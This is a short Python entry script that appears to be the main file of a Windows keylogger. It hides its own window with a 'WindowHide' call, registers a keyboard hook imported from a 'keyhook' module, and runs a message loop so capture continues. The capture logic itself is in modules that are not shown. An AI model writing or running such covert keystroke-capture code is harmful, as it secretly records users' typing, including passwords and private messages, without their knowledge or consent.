import pythoncom
from keyhook import registerEvent
from winfo import WindowHide

def main():
    WindowHide()
    registerEvent()
    pythoncom.PumpMessages() 

if __name__ == "__main__":
    main()
